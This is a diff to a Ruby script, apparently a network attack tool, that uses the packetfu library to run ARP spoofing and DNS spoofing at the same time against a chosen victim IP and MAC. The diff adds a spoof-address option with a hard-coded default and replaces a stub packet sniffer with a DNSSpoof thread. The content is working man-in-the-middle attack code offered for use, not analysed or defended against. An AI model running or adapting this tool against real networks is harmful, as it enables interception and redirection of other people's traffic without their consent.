@@ -7,7 +7,7 @@ require 'rubygems'
 require 'packetfu'
 require 'thread'
 
-#require 'dns.rb'
+require './dns.rb'
 require './arp.rb'
 require './lib/lib_trollop.rb'
 
@@ -25,6 +25,7 @@ Usage:
     
     opt :host, "Victim IP", :short => "H", :type => :string, :default => "127.0.0.1" # String --host <s>, default 127.0.0.1
     opt :mac, "Victim MAC", :short => "M", :type => :string # String --mac <s>
+    opt :spoof, "Spoofig IP", :short => "S", :type => :string, :default => "70.70.242.254" # String --spoof <s>, default 70.70.242.254
     opt :gate, "Gateway", :short => "G", :type => :string, :default => "192.168.0.100" # String --gate <s>, default 192.168.0.100
     opt :iface, "Interface", :short => "i", :type => :string, :default => "em1" # String --iface <s>, default em1
     
@@ -37,29 +38,16 @@ end # Trollop
 # Check if user is running as root
 raise "Must run as root or `sudo ruby #{$0}`" unless Process.uid == 0
 
-#-----
-# Start Capturing
-#-----
-def sniff(iface = "em1")
-    # Sniff only DNS requests
-    filter = "udp and dst port 53"
-    pcap = Packetfu::Capture.new(:iface => iface, :start => true, 
-                                 :filter => filter)
-
-    pcap.stream.each do |pkt|
-        packet = Packetfu::Packet.parse pkt
-    end # pcap.stream.each do |pkt|
-end # sniff
-
 begin
     # Create necessary objects
-    arp = ARPSpoof.new("victim IP", "victim mac", "router ip", "wlan0")
+    arp = ARPSpoof.new(opt[:host], opt[:mac], opt[:gate], opt[:iface])
+    dns = DNSSpoof.new(opt[:spoof], opt[:host], opt[:mac], opt[:iface])
     arp_thread = Thread.new { arp.start }
-    sniff_thread = Thread.new{ sniff }
+    dns_thread = Thread.new{ dns.start }
     
     # Start both spoofing threads
     arp_thread.join
-    sniff_thread.join
+    dns_thread.join
     
     # Catch CTRL^C
     rescue Interrupt
@@ -69,8 +57,7 @@ begin
     Thread.kill(arp_thread)
     
     # Stop DNS spoofing
-    #dns.stop
-    Thread.kill(sniff_thread)
+    Thread.kill(dns_thread)
     
     exit 0
 end
